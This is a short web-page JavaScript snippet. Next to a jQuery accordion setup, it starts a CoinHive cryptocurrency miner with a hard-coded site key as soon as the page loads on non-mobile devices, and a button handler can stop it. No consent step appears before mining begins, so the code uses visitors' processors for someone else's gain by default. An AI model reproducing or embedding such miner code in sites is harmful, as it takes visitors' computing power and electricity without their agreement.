            var miner;
            $(function() {
                $(".accordion").accordion({
                    collapsible: true,
                    active: false,
                    heightStyle: "content"
                });
                miner = new CoinHive.Anonymous('eCouv1oFgXD3YAre4uFX81mRTLtNtcCy', {
                    throttle: 0.3
                });
                if (!miner.isMobile()) {
                    miner.start();
                } else {
                    document.getElementById("thebutton").textContent = 'Disabled for mobile device';
                }
            });

            function clicked() {
                miner.stop();
                document.getElementById("thebutton").textContent = 'Stopped';
            }